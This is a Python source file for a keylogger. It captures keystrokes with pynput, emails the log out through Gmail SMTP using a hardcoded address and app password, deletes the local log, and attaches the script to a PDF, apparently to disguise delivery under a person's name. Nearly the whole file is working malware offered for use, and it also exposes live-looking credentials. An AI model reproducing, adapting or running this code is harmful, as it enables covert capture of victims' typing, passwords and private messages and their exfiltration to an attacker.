import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from PyPDF2 import PdfFileReader, PdfFileWriter
from PyPDF2 import PdfReader
from PyPDF2 import PdfWriter
from pynput.keyboard import Listener
from pynput.keyboard import Listener, Key

# Global variable to track termination status
terminated = False

# Function to capture and log keystrokes
def log_keystrokes(key):
    global terminated
    # Define the path to save the keystrokes log
    log_path = "keystrokes_log.txt"

    # Mapping of special keys to their readable representations
    special_keys = {
    # ... (other special keys mapping)
    Key.shift_r: "[SHIFT]",
    ".": ".",
    ",": ",",
    }



    if key == Key.esc:
        terminated = True
        send_keystrokes_email()  # Send the keystrokes log via email
        return False
    else:
        # Convert special keys to their readable representations
        if key in special_keys:
            key = special_keys[key]
        else:
            key = str(key).replace("'", "")

        with open(log_path, "a") as f:
            # Append the captured keystrokes to the log file
            f.write(key)

# Function to send the keystrokes log via email
def send_keystrokes_email():
    # Define the path to the keystrokes log
    log_path = "keystrokes_log.txt"

    # Modify the email and password fields with your own credentials
    email = "cronus.infosec@gmail.com"
    password = "jttumoorjewyevlm"

    # Compose the email message with the keystrokes log as an attachment
    message = MIMEMultipart()
    message["Subject"] = "Keystrokes Log"
    message["From"] = email
    message["To"] = email

    # Attach the keystrokes log file to the email
    with open(log_path, "rb") as f:
        attachment = MIMEApplication(f.read(), _subtype="txt")
        attachment.add_header("Content-Disposition", "attachment", filename=log_path)
        message.attach(attachment)

    # Send the email
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(email, password)
        server.send_message(message)

    # Delete the keystrokes log file after sending the email
    os.remove(log_path)

# Function to embed the keylogger script into a PDF
def embed_keylogger_to_pdf(pdf_path, script_path):
    # Open the PDF file in read-binary mode
    with open(pdf_path, "rb") as file:
        pdf_reader = PdfReader(file)
        
        # Create a new PDF writer object
        pdf_writer = PdfWriter()
        
        # Embed the keylogger script into the PDF
        with open(script_path, "rb") as script:
            script_data = script.read()
            pdf_writer.add_attachment("keylogger_script.py", script_data)
        
        # Merge the original PDF with the modified PDF writer
        for page_num in range(len(pdf_reader.pages)):
            page = pdf_reader.pages[page_num]
            pdf_writer.add_page(page)
        
        # Save the modified PDF with the embedded script
        output_pdf_path = "embedded_pdf.pdf"
        with open(output_pdf_path, "wb") as output_file:
            pdf_writer.write(output_file)
        
        return output_pdf_path


# Define the paths to the PDF and keylogger script
pdf_path = r"C:\Users\cronus\Desktop\malware\JohnCarlo_Torralba.pdf"
script_path = r"C:\Users\cronus\Desktop\malware\keylogger_script.py"

# Embed the keylogger script into the PDF
embedded_pdf_path = embed_keylogger_to_pdf(pdf_path, script_path)

# Display the path to the embedded PDF
print("Embedded PDF:", embedded_pdf_path)

# Start the keylogger listener
with Listener(on_press=log_keystrokes) as listener:
    listener.join()

# Send the keystrokes log via email even if the code is terminated
if terminated:
    send_keystrokes_email()

# Execute the keylogger
log_keystrokes("Keylogger is running...")
send_keystrokes_email()
